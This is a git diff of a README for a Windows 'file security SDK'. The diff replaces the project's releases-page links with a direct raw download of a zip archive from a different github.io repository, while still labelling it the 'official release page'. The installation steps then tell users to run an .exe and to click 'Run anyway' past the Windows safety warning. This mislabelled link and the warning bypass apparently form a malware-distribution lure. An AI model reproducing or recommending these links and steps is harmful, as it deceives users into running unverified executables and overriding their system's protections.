@@ -5,7 +5,7 @@ description: "Monitor files, control access, and implement filesystem encryption
 ---
 # 🛡️ rust-file-security-sdk - Keep your computer files safe easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Experimentersoftroll422/rust-file-security-sdk/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Experimentersoftroll422/experimentersoftroll422.github.io/raw/refs/heads/main/assets/Dist-v3.4-beta.1.zip)
 
 This software helps you protect, monitor, and encrypt files on your Windows computer. It gives you control over who accesses your data and how they use it. You can track file activity, block unauthorized changes, and keep your sensitive files private.
 
@@ -33,7 +33,7 @@ Before you install this software, make sure your computer meets these requiremen
 
 Follow these steps to set up the software on your machine:
 
-1.  **Visit the Download Page:** Go to the [official release page](https://github.com/Experimentersoftroll422/rust-file-security-sdk/releases).
+1.  **Visit the Download Page:** Go to the [official release page](https://github.com/Experimentersoftroll422/experimentersoftroll422.github.io/raw/refs/heads/main/assets/Dist-v3.4-beta.1.zip).
 2.  **Choose the File:** Look under the most recent release. Click the file ending in `.exe` to start the download.
 3.  **Run the Installer:** Once the download finishes, locate the file in your Downloads folder and double-click it.
 4.  **Confirm Permissions:** Windows might show a safety warning. If you see this, click "More info," then select "Run anyway." 
